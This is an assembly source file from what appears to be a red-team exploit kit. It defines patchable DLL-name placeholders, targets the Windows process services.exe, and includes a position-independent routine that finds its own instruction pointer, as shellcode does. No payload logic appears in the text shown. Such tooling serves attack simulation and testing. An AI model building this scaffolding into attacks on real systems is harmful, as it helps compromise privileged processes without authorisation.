;;
;; Exploit
;;
;; GuidePoint Security LLC
;;
;; Threat and Attack Simulation
;;

GLOBAL LibSz
GLOBAL LnkSz
GLOBAL EvtSz
GLOBAL PrcSz
GLOBAL Array
GLOBAL Table
GLOBAL GetIp

[SECTION .text$G]

	;;
	;; Variables that are patched
	;;
LibSz:
	dw __utf16__( 'AAAAAAAAAAAA.dll' ), 0
LnkSz:
	dw __utf16__( 'BBBBBBBBBBBB.dll' ), 0
EvtSz:
	dw __utf16__( 'CCCCCCCCCCCC.dll' ), 0
PrcSz:
	dw __utf16__( 'services.exe' ), 0

Array:
	;;
	;; Alphabet for characters
	;;
	dw __utf16__( 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' )
	dw 0

Table:
	;;
	;; Table.h
	;;
	dq	0
	dq	0
	dq	0

GetIp:
	;;
	;; Execute next instruction
	;;
	call	get_ret_ptr

get_ret_ptr:

	;;
	;; Get return and sub diff
	;;
	pop	rax
	sub	rax, 5
	ret

Leave:
	db 'E', 'N', 'D', 'O', 'F', 'C', 'O', 'D', 'E'
